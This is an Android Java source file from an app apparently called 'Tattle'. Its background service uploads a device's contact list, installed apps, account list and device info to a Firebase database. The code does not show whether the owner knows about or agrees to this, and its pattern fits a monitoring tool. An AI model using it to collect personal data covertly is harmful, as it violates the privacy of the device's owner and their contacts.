package com.codies.Tattle.DataUploadServices;

import android.accounts.Account;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.JobIntentService;

import com.codies.Tattle.Models.ContactsInfo;
import com.codies.Tattle.Models.InstalledApps;
import com.codies.Tattle.OtherUtils.SharedPrefs;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.List;

public class BasicDataUploadService extends JobIntentService {

    private static final String TAG = "BasicDataUploadService";

    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    FirebaseAuth firebaseAuth;
    SharedPrefs sharedPrefs;

    public static void enqueueWork(Context context, Intent work) {
        enqueueWork(context, BasicDataUploadService.class, 123, work);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sharedPrefs = SharedPrefs.getInstance(this);
        firebaseDatabase = FirebaseDatabase.getInstance();
        firebaseAuth = FirebaseAuth.getInstance();
        databaseReference = firebaseDatabase.getReference();
    }

    @Override
    protected void onHandleWork(@NonNull Intent intent) {
        Log.i(TAG, "onHandleWork: " + "working");
        List<ContactsInfo> contactsInfoList = (List<ContactsInfo>) intent.getSerializableExtra("contacts");
        List<InstalledApps> installedAppsList = (List<InstalledApps>) intent.getSerializableExtra("installedApps");
        List<Account> accountList = (List<Account>) intent.getSerializableExtra("accounts");
        String deviceInfo = intent.getStringExtra("deviceInfo");

        if (contactsInfoList != null) {
            databaseReference.child("users").child(firebaseAuth.getCurrentUser().getUid()).child("ContactList").setValue(contactsInfoList).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    sharedPrefs.saveBasicDataUploaded(true);
                    Log.i(TAG, "onSuccess: "+"contacts posted");
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    sharedPrefs.saveBasicDataUploaded(false);
                    Log.i(TAG, "onFailure: " + e.getMessage());
                }
            });
        }
        if (installedAppsList != null) {
            databaseReference.child("users").child(firebaseAuth.getCurrentUser().getUid()).child("InstalledApps").setValue(installedAppsList).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    sharedPrefs.saveBasicDataUploaded(true);
                    Log.i(TAG, "onSuccess: " + "Installed Apps posted");
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    sharedPrefs.saveBasicDataUploaded(false);
                    Log.i(TAG, "onFailure: " + e.getMessage());
                }
            });
        }

        if (deviceInfo != null) {
            databaseReference.child("users").child(firebaseAuth.getCurrentUser().getUid()).child("DeviceInfo").setValue(deviceInfo).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    sharedPrefs.saveBasicDataUploaded(true);
                    Log.i(TAG, "onSuccess: "+"DeviceInfo posted");
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    sharedPrefs.saveBasicDataUploaded(false);
                    Log.i(TAG, "onFailure: " + e.getMessage());
                }
            });
        }

        if (accountList != null) {
            databaseReference.child("users").child(firebaseAuth.getCurrentUser().getUid()).child("AccountList").setValue(accountList).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    sharedPrefs.saveBasicDataUploaded(true);
                    Log.i(TAG, "onSuccess: "+"AccountList posted");
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    sharedPrefs.saveBasicDataUploaded(false);
                    Log.i(TAG, "onFailure: " + e.getMessage());
                }
            });
        }

    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "onDestroy: ");
        super.onDestroy();
    }

    @Override
    public boolean onStopCurrentWork() {
        Log.i(TAG, "onStopCurrentWork: ");
        return super.onStopCurrentWork();
    }

}
